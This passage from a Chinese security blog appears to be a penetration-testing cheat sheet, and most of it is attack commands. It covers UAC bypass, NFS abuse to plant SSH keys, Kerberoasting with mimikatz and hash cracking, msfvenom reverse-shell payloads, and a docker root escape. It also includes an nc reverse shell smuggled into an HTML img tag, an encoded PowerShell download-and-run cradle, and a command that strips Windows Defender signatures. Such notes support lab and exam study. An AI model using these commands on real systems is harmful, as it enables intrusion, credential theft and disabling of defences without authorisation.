+<figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell">powershell <span class="hljs-literal">-ep</span> Bypass slui_bypass_uac.ps1<br>powershell <span class="hljs-literal">-Exec</span> Bypass slui_bypass_uac.ps1<br></code></pre></div></td></tr></table></figure>
+<p>NFS easy exploit</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">showmount -e 10.11.1.xx<br><span class="hljs-comment"># vers=3 display UID PID</span><br>mount -t nfs -o vers=3 10.11.1.x:/home /tmp/home<br><br><span class="hljs-comment"># Permission denied</span><br>useradd <span class="hljs-built_in">test</span> <br><span class="hljs-comment"># change UID GID /etc/passwd</span><br><br><span class="hljs-comment"># if share /home</span><br>mkdir .ssh <br>ssh-keygen -f target<br>cat target.pub &gt; authorized_keys<br>cp authorized_keys /tmp/home/USER/.ssh/<br><br>ssh USER@10.11.1.x -i target<br></code></pre></div></td></tr></table></figure>
+<p>if missing ticket</p>
+<figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell"><span class="hljs-comment"># missing ticket</span><br><span class="hljs-built_in">Invoke-Kerberoast</span>.ps1<br><span class="hljs-comment"># or</span><br><span class="hljs-built_in">Get-SPN</span>.ps1<br></code></pre></div></td></tr></table></figure>
+<p>Kerberoasting / John / Hashcat</p>
+<ul>
+<li><p>mimikatz.exe</p>
+</li>
+<li><p>Powershell-Empire -&gt; Invoke-kerberoast</p>
+</li>
+<li><p>kirbi2hashcat.py -&gt; Is Output John format</p>
+</li>
+<li><p>kirbi2john.py</p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://www.pentestpartners.com/security-blog/how-to-kerberoast-like-a-boss/">How to: Kerberoast like a boss</a></p>
+</li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell">mimikatz.exe <span class="hljs-string">&quot;kerberos::list /export&quot;</span> <span class="hljs-string">&quot;exit&quot;</span><br><br><span class="hljs-comment"># Convert *.kirbi to john</span><br>python /opt/kirbi2hashcat/kirbi2hashcat.py *.kirbi &gt; hashcat/allhash.txt<br>python /usr/share/john/kirbi2john.py *.kirbi &gt; john/alljohn.txt<br><span class="hljs-comment"># $krb5tgs$18$...</span><br><br>john -<span class="hljs-literal">-format</span>=krb5tgs hashcat/allhash.txt <span class="hljs-literal">-w</span>=/usr/share/wordlists/rockyou.txt<br><br><br><span class="hljs-comment"># Convert *.kirbi to hashcat</span><br>Powershell<span class="hljs-literal">-Empire</span> - <span class="hljs-built_in">Invoke-kerberoast</span> - Hashcat format<br><span class="hljs-comment"># or Invoke-Kerberoast.ps1</span><br><span class="hljs-built_in">Import-Module</span> <span class="hljs-built_in">Invoke-Kerberoast</span>.ps1<br><span class="hljs-built_in">Invoke-Kerberoast</span> <span class="hljs-literal">-Domain</span> xor.com <span class="hljs-literal">-OutputFormat</span> HashCat | <span class="hljs-built_in">Select-Object</span> <span class="hljs-literal">-ExpandProperty</span> hash | <span class="hljs-built_in">out-file</span> <span class="hljs-literal">-Encoding</span> ASCII kerb<span class="hljs-literal">-Hash0</span>.txt<br><span class="hljs-comment"># $krb5tgs$23$ ...</span><br><br>hashcat <span class="hljs-literal">-m</span> <span class="hljs-number">13100</span> hashs/allhash.txt wordlist/rockyou.txt -<span class="hljs-literal">-force</span><br><br><br><span class="hljs-comment"># Use crel</span><br><span class="hljs-variable">$</span> python /opt/impacket/examples/GetUserSPNs.py <span class="hljs-literal">-request</span> xor.com/sqlserver <span class="hljs-literal">-dc</span><span class="hljs-literal">-ip</span> <span class="hljs-number">10.11</span>.<span class="hljs-number">1.120</span><br>Password: xxxx<br><br></code></pre></div></td></tr></table></figure>
+<p>Crack MsCacheV2(DCC2)</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">john --format=mscash2 mscash2.hash -w=/usr/share/wordlists/rockyou.txt<br><span class="hljs-comment"># username:hash</span><br><br>hashcat -m 2100 hashs/mscash2.hash wordlist/rockyou.txt --force<br><span class="hljs-comment"># $DCC2$10240#username#HASH</span><br><span class="hljs-comment"># https://tinyapps.org/docs/domain-cached-credentials.html</span><br></code></pre></div></td></tr></table></figure>
+<p>Unquoted Search Path</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">wmic service get name,displayname,pathname,startmode | findstr /i <span class="hljs-string">&quot;auto&quot;</span> | findstr /i /v <span class="hljs-string">&quot;C:\windows&quot;</span><br><br><span class="hljs-comment"># C:\Local\Bad Program\command.exe</span><br><span class="hljs-comment"># icacls &quot;C:\Local&quot;</span><br><span class="hljs-comment"># BUILTIN\Users:(W)</span><br><br><span class="hljs-comment"># msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=80 -f exe -o Program.exe</span><br><span class="hljs-comment"># or</span><br><span class="hljs-comment"># msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.0.4 LPORT=80 -e x86/shikata_ga_nai -i 7 -f raw &gt; met.bin</span><br><span class="hljs-comment"># Use shellter injection .bin in binary program (ex. whoami.exe)</span><br><span class="hljs-comment"># rename whoami.exe -&gt; Bad.exe -&gt; C:\Local\</span><br></code></pre></div></td></tr></table></figure>
+<p>group in docker</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">docker run -v /:/mnt --rm -it alpine chroot /mnt sh<br></code></pre></div></td></tr></table></figure>
+<br/>
+
+<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32<br>i686-w64-mingw32-gcc 1198.c -o ms05-018.exe -lws2_32 advapi32.lib<br><br><span class="hljs-comment"># 64 bit and 32 bit</span><br>i686-w64-mingw32-gcc -o win32.exe win32.c<br>x86_64-w64-mingw32-gcc -o win64.exe win32.c<br></code></pre></div></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">gcc -Wl,--hash-style=both -o exp exploit.c<br></code></pre></div></td></tr></table></figure>
+<p>可写目录</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># 可写目录</span><br>C:\Windows\System32\spool\drivers\color<br></code></pre></div></td></tr></table></figure>
+<p>可读文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># 可读文件</span><br>C:\Windows\win.ini<br></code></pre></div></td></tr></table></figure>
+<p>go 不同架构系统编译</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># GOOS : darwin, freebsd, linux, windows</span><br><span class="hljs-comment"># GOARCH : 386, amd64, arm</span><br><br>GOOS=linux GOARCH=amd64 go build -o linux_64<br>GOOS=linux GOARCH=386 go build -o i386_64<br><br>GOOS=windows GOARCH=amd64 go build -o win_64<br>GOOS=windows GOARCH=386 go build -o win_32<br></code></pre></div></td></tr></table></figure>
+<p>Nc one line</p>
+<figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-comment">&lt;!-- nc.traditional$IFS-e$IFS/bin/bash$IFS&#x27;10.10.16.3&#x27;$IFS&#x27;4444&#x27; --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">http://10.10.16.3/$(nc.traditional$IFS-e$IFS/bin/bash$IFS</span>&#x27;<span class="hljs-attr">10.10.16.3</span>&#x27;$<span class="hljs-attr">IFS</span>&#x27;<span class="hljs-attr">4444</span>&#x27;) /&gt;</span><br></code></pre></div></td></tr></table></figure>
+<br/>
+
+<h2 id="Note"><a href="#Note" class="headerlink" title="Note"></a>Note</h2><figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell"><span class="hljs-comment"># 调用 Powershell IEX() 引号问题</span><br><span class="hljs-comment"># ...cmd(&#x27;powershell &quot;IEX()&quot;&#x27;)</span><br><br>powershell <span class="hljs-string">&quot;IEX(New-Object Net.WebClient).DownloadString(&#x27;http://10.11.1.11/callme.ps1&#x27;)&quot;</span><br></code></pre></div></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;IEX(New-Object Net.WebClient).DownloadString(&#x27;http://10.11.1.11/callme.ps1&#x27;)&quot;</span> | iconv -t UTF-16LE | base64 -w 0<br><br><span class="hljs-comment"># SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMQAuADEALgAxADEALwBjAGEAbABsAG0AZQAuAHAAcwAxACcAKQAKAA==</span><br></code></pre></div></td></tr></table></figure>
+<figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell">powershell <span class="hljs-literal">-enc</span> SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMQAuADEALgAxADEALwBjAGEAbABsAG0AZQAuAHAAcwAxACcAKQAKAA==<br></code></pre></div></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># PROGRA~1 = Program Files</span><br><br><span class="hljs-built_in">cd</span> <span class="hljs-string">&quot;C:\Program Files\Windows Defender&quot;</span><br><span class="hljs-comment"># or</span><br><span class="hljs-built_in">cd</span> <span class="hljs-string">&quot;C:\PROGRA~1\Windows Defender&quot;</span><br><br>MpCmdRun.exe -RemoveDefinitions -All<br></code></pre></div></td></tr></table></figure>
+<p>bash 单双引号</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;#!/bin/bash\nrm -rf /TMP/*&quot;</span> &gt; cron<br><span class="hljs-comment"># bash: !/bin/bash\nrm: event not found</span><br><br><span class="hljs-built_in">echo</span> -e <span class="hljs-string">&#x27;#!/bin/bash\nrm -rf /TMP/*&#x27;</span> &gt; cron<br><br>cat cron<br><span class="hljs-meta">#!/bin/bash</span><br>rm -rf /TMP/*<br></code></pre></div></td></tr></table></figure>
+<p>echo -n</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;63616c632e657865&quot;</span> | wc -c<br><span class="hljs-comment"># 17</span><br><br><span class="hljs-built_in">echo</span> -n <span class="hljs-string">&quot;63616c632e657865&quot;</span> | wc -c<br><span class="hljs-comment"># 16</span><br></code></pre></div></td></tr></table></figure>
+<p>小端显示</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;1120110D&quot;</span> | tac -rs .. | <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$(tr -d &#x27;\n&#x27;)</span>&quot;</span><br><span class="hljs-comment"># 0D112011</span><br></code></pre></div></td></tr></table></figure>
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/">工具使用</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/Tools/">Tools</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2020/11/07/13_35_bypass_uac_fodhelper/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Bypass UAC Fodhelper</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2019/09/13/MS17_010%E5%A4%8D%E7%8E%B0/">
+                        <span class="hidden-mobile">MS17-010复现</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js" ></script>
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+</body>
+</html>
